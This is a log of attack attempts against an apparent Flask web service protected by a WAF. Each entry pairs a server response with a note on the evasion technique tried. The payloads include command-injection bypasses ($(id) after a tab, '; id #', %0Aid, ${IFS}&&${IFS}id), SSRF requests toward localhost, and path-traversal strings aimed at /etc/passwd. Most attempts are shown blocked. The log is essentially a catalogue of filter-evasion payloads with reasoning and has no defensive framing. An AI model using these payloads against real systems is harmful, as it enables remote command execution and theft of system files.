{"error":"blocked_by_waf","match":"host=127.0.0.1%09$(id)","pattern":"[;&|`$()\\\\n]"}
technique: Tab character (%09) as separator with $() — WAF regex blocks literal \n but tab+$() may slip through if pattern anchoring is loose

raw_stdout: {"error":"blocked_by_waf","match":"host=127.0.0.1 -c 1; id #","pattern":"[;&|`$()\\\\n]"}
technique: Semicolon with trailing comment — tests if WAF only blocks URL-encoded forms of ; but not literal ASCII

raw_stdout: ping: 127.0.0.1%0Aid: Name or service not known
technique: Capital-A URL-encoded newline (%0A vs %0a) — case sensitivity bypass on WAF regex \\n literal check

raw_stdout: {"error":"blocked_by_waf","match":"host=127.0.0.1${IFS}&&${IFS}id","pattern":"[;&|`$()\\\\n]"}
technique: $IFS word-splitting with && — WAF blocks bare $() and | but $IFS with && may evade single-pattern regex

raw_stdout: {"error":"blocked_private_ip","host":"127.0.0.1"}
technique: https scheme (whitelisted) + whitelisted host 127.0.0.1 — WAF allows both scheme and host; internal port 8080 may still be reachable

raw_stdout: {"error":"blocked_host","host":"localhost"}
technique: https+localhost (both whitelisted) with file path — tests if urllib follows to local HTTP server that serves filesystem or if /etc/passwd is web-exposed

raw_stdout: {"error":"blocked_by_waf","match":"name=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd","pattern":"[;&|`$()\\\\n]"}
technique: Double-dot obfuscation: `....//` collapses to `../` after naive `..` substring strip — WAF blocks `..` but `....` contains it only as a subsequence, not a 2-char run if WAF checks exact `..` then strips once

raw_stdout: {"error":"blocked_by_waf","match":"name=%252e%252e%252fetc%252fpasswd","pattern":"[;&|`$()\\\\n]"}
technique: Full URL-encoding of ../etc/passwd — WAF checks decoded `..` substring but if check runs pre-decode this bypasses it; os.path.join receives URL-decoded value from Flask
